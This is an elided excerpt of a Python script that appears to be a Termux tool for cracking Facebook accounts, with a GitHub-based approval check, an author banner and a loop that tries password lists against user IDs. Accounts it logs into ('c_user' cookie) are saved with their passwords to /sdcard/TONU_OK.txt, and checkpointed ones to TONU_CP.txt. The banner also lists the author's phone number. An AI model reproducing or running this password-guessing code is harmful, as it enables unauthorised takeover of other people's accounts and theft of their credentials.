...
def main_apv():
    ...
    try:
        ...
        key1=open('/data/data/com.termux/files/usr/bin/.Tonu-cov', 'r').read()
    ...
    r1=requests.get("https://github.com/Tonu-143/approval.txt/blob/main/approval.txt").text
...
logo="""
\x1b[1;92m.____  _____      _______ ______ _____  __  __ _    ___   __
 |  _ \|  __ \    |__   __|  ____|  __ \|  \/  | |  | \ \ / /
 | |_) | |  | |______| |  | |__  | |__) | \  / | |  | |\ V / 
 |  _ <| |  | |______| |  |  __| |  _  /| |\/| | |  | | > <  
 | |_) | |__| |      | |  | |____| | \ \| |  | | |__| |/ . \ 
 ...
 [$]*****************************************************[$]
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : {MEHEDI HASAN TONU}   ║
   \x1b[1;92m║ AUTHOR    :  MEHEDI HASAN TONU      ║
   \x1b[1;92m║ GITHUB    : TONU-143║
   \x1b[1;92m║ FACEBOOK  : MEHEDI HASAN TONU   ║
   \x1b[1;92m║ Group     :   AKHONZADA║
   \x1b[1;92m║ WHATSAPP  : +8801759916221  ║
   \x1b[1;92m╚═════════════════════════════╝
 [$]*****************************************************[$]
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/TONU-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/TONU-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back TONU-PRO Tools")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[TONU]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/TONU_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/TONU_CP.txt' , 'a').write('%s\n' % wrt)
